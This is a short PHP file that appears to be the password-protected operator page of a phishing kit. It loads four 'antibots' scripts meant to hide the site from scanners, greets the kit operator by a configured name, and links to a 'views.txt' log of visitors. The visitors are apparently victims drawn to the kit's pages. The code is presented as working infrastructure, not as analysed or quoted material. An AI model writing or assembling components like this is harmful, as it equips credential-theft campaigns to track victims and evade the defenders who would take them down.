<?php
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);

    include '../manage/system/config.php';
	require '../manage/antibots/Bo1.php';
	require '../manage/antibots/Bo2.php';
	require '../manage/antibots/Bo3.php';
	require '../manage/antibots/Bo4.php';
    $sessioncode = md5(__FILE__);
    if(!empty($paswd) and $_SESSION[$sessioncode] != $paswd){
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $paswd) {
        $_SESSION[$sessioncode] = $paswd;
    }
    else {
        print "<title>Admin</title><br><pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}
?>
<title>Welcome <?php echo $spmnm ?></title>
<link rel="shortcut icon" href="../manage/lib/img/newico.ico" />
<font face="Arial"><?php echo $spmnm ?>, Click <a target="_blank" href="views.txt">Here</a> to see Visitors.<br>
